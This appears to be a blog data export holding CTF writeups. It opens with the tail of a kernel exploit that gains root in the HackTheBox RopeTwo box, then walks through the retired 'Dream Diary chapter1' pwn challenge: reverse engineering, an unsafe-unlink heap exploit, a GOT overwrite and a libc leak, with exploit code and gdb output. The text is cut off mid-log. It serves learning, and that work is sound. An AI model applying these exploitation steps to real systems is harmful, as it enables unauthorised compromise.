0xffffffff), rop, sizeof(rop)); puts(\u0026#34;[*] Finished writing rop chain to mmap\u0026#39;d page\u0026#34;); fill(fd, 0, 0x420, \u0026amp;buf); for(int i=0; i\u0026lt;0x100; i++) { ioctl(spray_fd[i], 0, 0); } return 0; } Repacking the initramfs.cpio with the compiled exploit and running it:-\nCompile it with the gcc -static -masm=intel xpl.c -o xpl\nNow continuing the execution, we will get root on the QEMU instace.\nNow, the exploit is ready, bear in mind the exploit is not very reliable like of those standard exploit one can compile, run and poof, root. For the one I created, I had to reset the machine quite few times, but after some tries, I got the root:-\nThe reason I ran the exploit as chromeuser to get root is because the LKM was accessible with the both r4j and chromeuser.\nThank you!!!\n","date":"3 January 2021","permalink":"/posts/ropetwo-hackthebox/","section":"Posts","summary":"This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I\u0026rsquo;ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let\u0026rsquo;s start.","title":"HTB: RopeTwo Writeup"},{"content":"","date":null,"permalink":"/tags/pwn-hackthebox-v8-kernel-heap-tcache-libc-2.29/","section":"Tags","summary":"","title":"Pwn, Hackthebox, V8, Kernel, Heap, Tcache, Libc-2.29"},{"content":"This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn\u0026rsquo;t get time for this writeup, so I will write it here.\nAttachment #Binary: Get Here Exploit: Get Here\nInitial Analysis #First of, all we will see the binary and the security mechanisms on the binary and see the workflow of it. Let\u0026rsquo;s identify the file:-\n0 [05:10:38] vagrant@oracle(oracle) HackTheBox\u0026gt; file chapter1 chapter1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fd205b7bbec91799613399634a187d1ca71e1a3, stripped So, this is a 64 bit binary and on top of that it is stripped, which means reverse engineering it\u0026rsquo;ll take quite sometime, let\u0026rsquo;s check the security mechanisms:-\n0 [05:10:41] vagrant@oracle(oracle) HackTheBox\u0026gt; checksec chapter1 [*] \u0026#39;/media/sf_Pwning/HackTheBox/chapter1\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Canary and NX Enabled means that overflow is not gonna happen easily considering iff any kind of overflow exists, and it has Partial RELRO which Global Offset Table would be in r/w section which means we can overwrite the GOT entries.\nAll things, aside let\u0026rsquo;s run the binary:-\n2 [05:12:09] vagrant@oracle(oracle) HackTheBox\u0026gt; ./chapter1 +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ \u0026gt;\u0026gt; 1 Size: 100 Data: AAA Success! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ \u0026gt;\u0026gt; 2 Index: 0 Data: AKSSKSK Done! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ \u0026gt;\u0026gt; Invalid choice! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ \u0026gt;\u0026gt; 3 Index: 0 So, it seems like it allocates a specific amount of size in memory and then let us store the data at allocated region. On top of that it allow us to delete the allocated region and even edit an allocated chunk. Since we want to pwn it, we need to reverse engineer it, let\u0026rsquo;s go.\nReverse Engineering #First off, we will load the binary in IDA and let it do the work, then we will analyze the functions. First, we will check the main function:-\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int v3; // eax __int64 buf; // [rsp+0h] [rbp-10h] unsigned __int64 real_canary; // [rsp+8h] [rbp-8h] real_canary = canary; buf = 0LL; setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); while ( 1 ) { while ( 1 ) { print_menu(); read(0, \u0026amp;buf, 4uLL); v3 = atoi((const char *)\u0026amp;buf); if ( v3 != 2 ) break; edit(); } if ( v3 \u0026gt; 2 ) { if ( v3 == 3 ) { delete(); } else { if ( v3 == 4 ) exit(0); LABEL_13: puts(\u0026#34;Invalid choice!\u0026#34;); } } else { if ( v3 != 1 ) goto LABEL_13; allocate(); } } } Quite simple, it calls print_menu and then read the integer and depending on what option we choose, it calls the function, the only function which stands out for the interest here is allocate, edit and delete as this is the core functions of the binary, let\u0026rsquo;s check those out.\nNOTE: I have named the functions to more readable names, so it\u0026rsquo;ll help in understanding rest of the code.\nLet\u0026rsquo;s check the allocate:-\nunsigned __int64 allocate() { signed int i; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] char nptr[8]; // [rsp+10h] [rbp-10h] unsigned __int64 real_canary; // [rsp+18h] [rbp-8h] real_canary = canary; *(_QWORD *)nptr = 0LL; for ( i = 0; ; ++i ) { if ( i \u0026gt; 15 ) { puts(\u0026#34;Too many notes!\u0026#34;); return canary ^ real_canary; } if ( !ptr[i] ) break; } printf(\u0026#34;\\nSize: \u0026#34;); read_string(nptr, 6uLL); size = atoi(nptr); ptr[i] = (char *)malloc(size); if ( !ptr[i] ) { puts(\u0026#34;Malloc error!\u0026#34;); exit(-1); } printf(\u0026#34;Data: \u0026#34;, 6LL); read_string(ptr[i], size); puts(\u0026#34;Success!\u0026#34;); return canary ^ real_canary; } So, first of it checks if the total number of allocated notes is not more than 15, if it is not then it reads the size and then it allocates a chunk of size given, with the index of the note stored in the gloabl variable named ptr. For example, if none of the note has been allocated and given size is 0x40, the allocate function will do malloc(0x40) then it address of the allocated chunk will be stored at ptr[0] = \u0026amp;allocated_chunk.\nNow, it doesn\u0026rsquo;t do much stuff which seems to be of interest, so let\u0026rsquo;s move on the delete function:-\nunsigned __int64 delete() { int v1; // [rsp+Ch] [rbp-14h] __int64 buf; // [rsp+10h] [rbp-10h] unsigned __int64 real_canary; // [rsp+18h] [rbp-8h] real_canary = canary; buf = 0LL; printf(\u0026#34;Index: \u0026#34;); read(0, \u0026amp;buf, 4uLL); v1 = atoi((const char *)\u0026amp;buf); if ( v1 \u0026gt;= 0 \u0026amp;\u0026amp; v1 \u0026lt;= 15 ) { if ( ptr[v1] ) { free(ptr[v1]); ptr[v1] = 0LL; puts(\u0026#34;Done!\u0026#34;); } else { puts(\u0026#34;No double-free for you!\u0026#34;); } } else { puts(\u0026#34;Out of bounds!\u0026#34;); } return canary ^ real_canary; } It reads the the index of the chunk smartly since it checks for the negative and OOB index and then it checks if there is a chunk which is not NULL\u0026rsquo;d already, if it\u0026rsquo;s not then it free\u0026rsquo;s the allocated chunk and makes the ptr[index] = 0 making the UAF out of option. But clearly, it didn\u0026rsquo;t NULL\u0026rsquo;d the free\u0026rsquo;d region, so maybe it\u0026rsquo;ll be useful later.\nLastly, we will check the edit function:-\nunsigned __int64 edit() { size_t v0; // ST08_8 int v2; // [rsp+4h] [rbp-1Ch] __int64 buf; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); buf = 0LL; printf(\u0026#34;Index: \u0026#34;); read(0, \u0026amp;buf, 4uLL); v2 = atoi((const char *)\u0026amp;buf); if ( v2 \u0026gt;= 0 \u0026amp;\u0026amp; v2 \u0026lt;= 15 ) { if ( ptr[v2] ) { v0 = strlen(ptr[v2]); printf(\u0026#34;Data: \u0026#34;, \u0026amp;buf); read_string(ptr[v2], v0); puts(\u0026#34;Done!\u0026#34;); } else { puts(\u0026#34;No UAF for you!\u0026#34;); } } else { puts(\u0026#34;Out of bounds!\u0026#34;); } return __readfsqword(0x28u) ^ v4; } There\u0026rsquo;s something fishy here, first the length for the read_string is calculated by strlen and then it is reading the data into the allocated memory. So, what is the catch here? To be more subtle, we have to know that strlen decided the length of a string when a NULL byte is recognized, for example if we have a string HELLO\\x00, here it has a NULL Byte in the end, so when strlen(\u0026quot;HELLO\\x00\u0026quot;) would be done, the returning value will be 5. but what if the string is not terminated by NULL byte, now since we know that in the edit the length for the read_string, since the string is not terminated by the NULL byte as we see in the read_string below:-\nssize_t __fastcall read_string(void *a1, size_t a2) { ssize_t result; // rax result = read(0, a1, a2); if ( (signed int)result \u0026lt;= 0 ) { puts(\u0026#34;Read error!\u0026#34;); exit(-1); } return result; } Now, it\u0026rsquo;ll calculate the data only if when the NULL byte will be encountered, there\u0026rsquo;s a off by one(kind of) vulnerability we can use. Without further ado, let\u0026rsquo;s move on.\nUnsafe Unlink #To get along with this, since the given hint was Xenial Xerus which is the name of the Ubuntu 16.04 which uses the LIBC-2.23 which, i back then had many low security checks for the heap internals, taking advantage of one of these loose checks within the malloc.c, we will be seeing it soon enough, the technique we will use here would be Unsafe Unlink, first of we will see what it is and how we will use it. To be precise, it is used when we have the global pointer address is known, in this case it\u0026rsquo;d be ptr, to understand it more, we will be seeing it in practice in next section, this is more of just an introduction to unlink. So, first of all, we see the following example of the Unsafe Unlink from how2heap repository:-\nNOTE: This technique is not applicable on fastbin chunks.\n0 [16:11:19] vagrant@oracle(oracle) glibc_2.25 (master %)\u0026gt; ./unsafe_unlink Welcome to unsafe unlink 2.0! Tested in Ubuntu 14.04/16.04 64bit. This technique can be used when you have a pointer at a known location to a region you can call unlink on. The most common scenario is a vulnerable buffer that can be overflown and has a global pointer. The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write. The global chunk0_ptr is at 0x602070, pointing to 0x12ee010 The victim chunk we are going to corrupt is at 0x12ee0a0 We create a fake chunk inside chunk0. We setup the \u0026#39;next_free_chunk\u0026#39; (fd) of our fake chunk to point near to \u0026amp;chunk0_ptr so that P-\u0026gt;fd-\u0026gt;bk = P. We setup the \u0026#39;previous_free_chunk\u0026#39; (bk) of our fake chunk to point near to \u0026amp;chunk0_ptr so that P-\u0026gt;bk-\u0026gt;fd = P. With this setup we can pass this check: (P-\u0026gt;fd-\u0026gt;bk != P || P-\u0026gt;bk-\u0026gt;fd != P) == False Fake chunk fd: 0x602058 Fake chunk bk: 0x602060 We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata. We shrink the size of chunk0 (saved as \u0026#39;previous_size\u0026#39; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk. It\u0026#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly If we had \u0026#39;normally\u0026#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80 We mark our fake chunk as free by setting \u0026#39;previous_in_use\u0026#39; of chunk1 as False. Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr. You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344 v At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location. chunk0_ptr is now pointing where we want, we use it to overwrite our victim string. Original value: Hello!~ New Value: BBBBAAAA The binary speak for itself, but let\u0026rsquo;s see, first of all we have a global array which contains the pointers to the allocated memory regions stored in the heap. Here, we have the global pointer stored at 0x602070 stored in the BSS region, now according to the example, it is pointing to the 0x12ee010 which is the first allocated chunk, next the victim chunk here is 0x12ee0a0, when the example says it creates a fake chunk withing the chunk0 it means we are creating a fake free\u0026rsquo;d chunk, which looks like:-\nchunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:\u0026#39; | Size of chunk, in bytes |P| mem-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . | nextchunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:\u0026#39; | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ We create a fake chunk where the fd pointer points to the 0x602058 and the bk pointer points to the 0x602060, as mentioned the example assumes we have overflow to manipulate the metadata of chunk i.e. prev_size and size or even fd or bk, in the example it clears out the PREV_IN_USE which is responsible for indicating if the chunk is in use or not by the program in one way or another. So, after that when we free the chunk we clear the PREV_IN_USE bit off, since we added a fake in the chunk before that, the heap manager will try to unlink the free\u0026rsquo;d chunk to make the heap more efficient for the next allocation. In the GLIBC-2.23 has the unlink mechanism as follows:-\n/* consolidate backward */ if (!prev_inuse(p)) { prevsize = p-\u0026gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } What we would be doing is the same as backward consolidation, going over this piece of the code we see that the it first checks if the prev_inuse is not 0, then it gets the prev_size from the chunk header, next it gets the chunk offset and then calls the unlink, let\u0026rsquo;s see the unlink snippet.\n#define unlink(AV, P, BK, FD) { \\ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;);\t\\ FD = P-\u0026gt;fd;\t\\ BK = P-\u0026gt;bk;\t\\ if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0))\t\\ malloc_printerr (\u0026#34;corrupted double-linked list\u0026#34;);\tTo be precise, we need to get through the 2 checks to call unlink for our exploit, those checks include:-\nThe prev_size should not be equal to the size of the next chunk. Then the other check is FD here is the fd address pointed by our chunk and vice versa should point to the chunk itself. Exploitation #Theories aside, it\u0026rsquo;s time to go into the exploitation phase, let\u0026rsquo;s create a exploit template to interact with the service:-\nfrom roppy import * def allocate(size, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(size)) p.sendlineafter(\u0026#34;: \u0026#34;, data) def edit(idx, data): p.sendlineafter(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) p.sendlineafter(\u0026#34;: \u0026#34;, data) def delete(idx): p.sendlineafter(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) def exploit(): # exploit if __name__ == \u0026#39;__main__\u0026#39;: p = process(\u0026#34;./chapter1\u0026#34;) elf = ELF(\u0026#34;chapter1\u0026#34;) exploit() So, next up, we will allocate chunks, five chunks would be good, of same size:-\nlog.info(\u0026#34;Created 5 chunks of size: 0x88\u0026#34;) allocate(0x88, \u0026#34;A\u0026#34;*0x88) allocate(0x88, \u0026#34;B\u0026#34;*0x88) allocate(0x88, \u0026#34;C\u0026#34;*0x88) allocate(0x88, \u0026#34;D\u0026#34;*0x88) allocate(0x88, \u0026#34;E\u0026#34;*0x88) Now, we will run the exploit and see the chunks in gdb:-\n0 [08:11:04] vagrant@oracle(oracle) HackTheBox\u0026gt; python3 chapter1.py [+] Starting program \u0026#39;./chapter1\u0026#39;: PID 2417 [*] Analyzing /media/sf_Pwning/HackTheBox/chapter1 [*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so [*] Created 5 chunks of size: 0x88 [..snip..] gef➤ heap chunks Chunk(addr=0x1945010, size=0x90, flags=PREV_INUSE) [0x0000000001945010 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA] Chunk(addr=0x19450a0, size=0x90, flags=PREV_INUSE) [0x00000000019450a0 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBBBBBBBB] Chunk(addr=0x1945130, size=0x90, flags=PREV_INUSE) [0x0000000001945130 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC] Chunk(addr=0x19451c0, size=0x90, flags=PREV_INUSE) [0x00000000019451c0 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD] Chunk(addr=0x1945250, size=0x90, flags=PREV_INUSE) [0x0000000001945250 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE] Chunk(addr=0x19452e0, size=0x20d30, flags=PREV_INUSE) ← top chunk gef➤ x/10xg 0x6020c0 0x6020c0:\t0x0000000001945010\t0x00000000019450a0 0x6020d0:\t0x0000000001945130\t0x00000000019451c0 0x6020e0:\t0x0000000001945250\t0x0000000000000000 Here, we have 5 chunks on the heap with the size 0x90 and then we have a global array having the pointers of the allocated chunk. Our target is to get control of the 0x6020c0 global array, so that we can manipulate the pointers stored within to it to get r/w primitive.\nThe plan here is to forge a fake chunk, such that we can point the fd and bk to the global array, this will be done with:-\nlog.info(\u0026#34;Preparing a fake chunk...\u0026#34;) payload = p64(0x0)*2 payload += p64(global_ptr - 0x18) payload += p64(global_ptr - 0x10) payload = payload.ljust(0x80, b\u0026#34;X\u0026#34;) payload += p64(0x80) payload += b\u0026#34;\\x90\u0026#34; log.info(\u0026#34;Fake chunk:\\n%s\u0026#34; %(hexdump(payload))) The fake chunk, if seen visually looks like:-\n------------------------------------- | 0 | 0 | ------------------------------------- | global_ptr - 0x18 | ------------------------------------- | global_ptr - 0x10 | ------------------------------------- | | | XXXXXXXXXX | | | ------------------------------------- | 0x80 | 0x90 | ------------------------------------ Now, running the exploit:-\n0 [08:31:09] vagrant@oracle(oracle) HackTheBox\u0026gt; python3 chapter1.py [+] Starting program \u0026#39;./chapter1\u0026#39;: PID 2777 [*] Analyzing /media/sf_Pwning/HackTheBox/chapter1 [*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so [*] Created 5 chunks of size: 0x88 [*] Paused [Press any key to continue] [*] Preparing a fake chunk... [*] Fake chunk: 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000010: c0 20 60 00 00 00 00 00 c8 20 60 00 00 00 00 00 |. `...... `.....| 00000020: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000030: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000040: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000050: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000060: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000070: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000080: 80 00 00 00 00 00 00 00 |........| [*] Editing chunk 3 with a fakr chunk [..snip..] gef➤ heap chunks Chunk(addr=0x230a010, size=0x90, flags=PREV_INUSE) [0x000000000230a010 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA] Chunk(addr=0x230a0a0, size=0x90, flags=PREV_INUSE) [0x000000000230a0a0 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBBBBBBBB] Chunk(addr=0x230a130, size=0x90, flags=PREV_INUSE) [0x000000000230a130 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC] Chunk(addr=0x230a1c0, size=0x90, flags=PREV_INUSE) [0x000000000230a1c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x230a250, size=0x90, flags=) [0x000000000230a250 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 EEEEEEEEEEEEEEEE] gef➤ x/49xg 0x230a1c0 - 0x10 0x230a1b0:\t0x4343434343434343\t0x0000000000000091 0x230a1c0:\t0x0000000000000000\t0x0000000000000000 0x230a1d0:\t0x00000000006020c0\t0x00000000006020c8 0x230a1e0:\t0x5858585858585858\t0x5858585858585858 0x230a1f0:\t0x5858585858585858\t0x5858585858585858 0x230a200:\t0x5858585858585858\t0x5858585858585858 0x230a210:\t0x5858585858585858\t0x5858585858585858 0x230a220:\t0x5858585858585858\t0x5858585858585858 0x230a230:\t0x5858585858585858\t0x5858585858585858 0x230a240:\t0x0000000000000080\t0x0000000000000090 0x230a250:\t0x4545454545454545\t0x4545454545454545 0x230a260:\t0x4545454545454545\t0x4545454545454545 0x230a270:\t0x4545454545454545\t0x4545454545454545 0x230a280:\t0x4545454545454545\t0x4545454545454545 0x230a290:\t0x4545454545454545\t0x4545454545454545 0x230a2a0:\t0x4545454545454545\t0x4545454545454545 0x230a2b0:\t0x4545454545454545\t0x4545454545454545 0x230a2c0:\t0x4545454545454545\t0x4545454545454545 0x230a2d0:\t0x4545454545454545\t0x0000000000020d31 Here, the our forged chunk is within the 3rd chunk, our fd points to the 0x6020c0 and the bk to the 0x6020c8, this aside, then we modified the prev_size of the chunk 0x230a1c0 to the 0x80 as it was 0x90 before, we did this because, our forged chunk must be considered from the 0x230a1c0 as from the we have an actual free\u0026rsquo;d chunk structure, then we made prev_inuse bit of the chunk 0x230a250 equal to the 0 to consider the chunk as a free\u0026rsquo;d chunk, so when we try to do free(chunk4) it\u0026rsquo;ll consolidate the adjacent chunks, hence doing an unsafe unlink, resulting in the fd of the free\u0026rsquo;d chunk pointing to the 0x6020c0.\nLet\u0026rsquo;s free the chunk 4 and see the memory content to make this more clear.\n0 [08:53:07] vagrant@oracle(oracle) HackTheBox\u0026gt; python3 chapter1.py [+] Starting program \u0026#39;./chapter1\u0026#39;: PID 2978 [*] Analyzing /media/sf_Pwning/HackTheBox/chapter1 [*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so [*] Created 5 chunks of size: 0x88 [*] Preparing a fake chunk... [*] Fake chunk: 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000010: c0 20 60 00 00 00 00 00 c8 20 60 00 00 00 00 00 |. `...... `.....| 00000020: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000030: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000040: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000050: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000060: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000070: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000080: 80 00 00 00 00 00 00 00 90 |.........| [*] Editing chunk 3 with a fakr chunk [*] Triggering Unlink [*] Switching to interactive mode Done! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ [..snip..] gef➤ heap chunks Chunk(addr=0x2236010, size=0x90, flags=PREV_INUSE) [0x0000000002236010 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA] Chunk(addr=0x22360a0, size=0x90, flags=PREV_INUSE) [0x00000000022360a0 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBBBBBBBB] Chunk(addr=0x2236130, size=0x90, flags=PREV_INUSE) [0x0000000002236130 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC] Chunk(addr=0x22361c0, size=0x90, flags=PREV_INUSE) [0x00000000022361c0 00 00 00 00 00 00 00 00 41 0e 02 00 00 00 00 00 ........A.......] gef➤ x/10xg 0x6020c0 0x6020c0:\t0x0000000002236010\t0x00000000022360a0 0x6020d0:\t0x0000000002236130\t0x00000000006020c0 Now as we see the global array having a pointer to itself on index 3, this means that the chunk 3 is now pointing to the global array itself, let\u0026rsquo;s see what happened under the hood when we did free(4), I will break it down in following steps:-\nThere was a forged free\u0026rsquo;d chunk with the fd and bk pointing to the global array. When the free(4) is called and the chunk 4 was initally freed and the forged chunk was coalesced with the chunk 4. Once coalesced, the unlink is triggered resulting in the 3rd chunk pointer in the global array being overwritten with the address we wanted it to. Now, we have the control over the chunk 3, we can edit it and get the other pointer overwritten too, if we could overwrite one of the entry with any GOT address, we can get the control over the binary.\nlog.info(\u0026#34;Changing freegot to print@plt for LIBC Leak\u0026#34;) edit(3, p64(elf.got(\u0026#34;free\u0026#34;))) edit(0, p64(elf.plt(\u0026#34;printf\u0026#34;))) So, from the code above you can see, first we overwrite the pointer returned by the chunk 3 which would be the global array itself, then we request for the first chunk via the edit function and since the 0th chunk address point to the free@got, we get the pointer of free@GOT and then it is being overwritten with the printf@plt.\n0 [13:09:56] vagrant@oracle(oracle) HackTheBox\u0026gt; python3 chapter1.py [+] Starting program \u0026#39;./chapter1\u0026#39;: PID 1985 [*] Analyzing /media/sf_Pwning/HackTheBox/chapter1 [*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so [*] Created 5 chunks of size: 0x88 [*] Preparing a fake chunk... [*] Fake chunk: 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000010: c0 20 60 00 00 00 00 00 c8 20 60 00 00 00 00 00 |. `...... `.....| 00000020: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000030: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000040: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000050: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000060: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000070: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000080: 80 00 00 00 00 00 00 00 90 |.........| [*] Editing chunk 3 with a fakr chunk [*] Triggering Unlink [*] Changing freegot to print@plt for LIBC Leak [*] Switching to interactive mode Done! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ \u0026gt;\u0026gt; Invalid choice! +------------------------------+ | Dream Diary | +------------------------------+ | [1] Allocate | | [2] Edit | | [3] Delete | | [4] Exit | +------------------------------+ \u0026gt;\u0026gt; $ [..snip..] 0x0000000000400710 printf@plt gef➤ got GOT protection: Partial RelRO | GOT functions: 11 [0x602018] free@GLIBC_2.2.5 → 0x400710 As you can see, we successfully overwritten the free@got with the PLT address of the printf. Now, we have the printf, as from the reverse engineering, we know that the free is done like free(ptr[index]), as the free is now printf, now it\u0026rsquo;ll do the printf(ptr(index]), as obvious it should be we have a format string vulnerability now, we can leak a LIBC address to defeat ASLR.\nlog.info(\u0026#34;Getting __libc_start_main\u0026#34;) allocate(0x88, \u0026#34;%15$p\u0026#34;) delete(4) p.recvline() libc_start_main = int(p.recvline().strip(b\u0026#34;\\n\u0026#34;), 16) log.info(\u0026#34;__libc_start_main+240: 0x%x\u0026#34; %(libc_start_main)) libc.address = libc_start_main - 240 - libc.function(\u0026#34;__libc_start_main\u0026#34;) log.info(\u0026#34;LIBC : 0x%x\u0026#34; %(libc.address)) Running the exploit now, we will have the LIBC leak:-\n0 [13:26:50] vagrant@oracle(oracle) HackTheBox\u0026gt; python3 chapter1.py [+] Starting program \u0026#39;./chapter1\u0026#39;: PID 2449 [*] Analyzing /media/sf_Pwning/HackTheBox/chapter1 [*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so [*] Created 5 chunks of size: 0x88 [*] Preparing a fake chunk... [*] Fake chunk: 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000010: c0 20 60 00 00 00 00 00 c8 20 60 00 00 00 00 00 |. `...... `.....| 00000020: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000030: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000040: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000050: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000060: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000070: 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 |XXXXXXXXXXXXXXXX| 00000080: 80 00 00 00 00 00 00 00 90 |.........| [*] Editing chunk 3 with a fakr chunk [*] Triggering Unlink [*] Changing freegot 